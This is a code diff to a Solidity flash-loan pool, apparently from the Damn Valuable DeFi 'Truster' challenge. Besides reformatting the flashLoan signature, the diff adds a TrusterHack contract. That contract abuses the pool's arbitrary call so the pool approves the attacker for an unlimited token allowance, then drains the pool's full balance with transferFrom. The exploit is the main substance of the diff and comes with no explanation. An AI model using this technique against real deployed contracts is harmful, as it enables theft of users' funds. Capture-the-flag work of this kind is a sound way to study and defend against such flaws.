@@ -21,11 +21,12 @@ contract TrusterLenderPool is ReentrancyGuard {
         token = _token;
     }
 
-    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
-        external
-        nonReentrant
-        returns (bool)
-    {
+    function flashLoan(
+        uint256 amount,
+        address borrower,
+        address target,
+        bytes calldata data
+    ) external nonReentrant returns (bool) {
         uint256 balanceBefore = token.balanceOf(address(this));
 
         token.transfer(borrower, amount);
@@ -35,5 +36,20 @@ contract TrusterLenderPool is ReentrancyGuard {
             revert RepayFailed();
 
         return true;
+    }
+}
+
+contract TrusterHack {
+    function attack(address _pool, address _token) external {
+        TrusterLenderPool pool = TrusterLenderPool(_pool);
+        DamnValuableToken token = DamnValuableToken(_token);
+
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            type(uint).max
+        );
+        pool.flashLoan(0, msg.sender, _token, data);
+        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
     }
 }
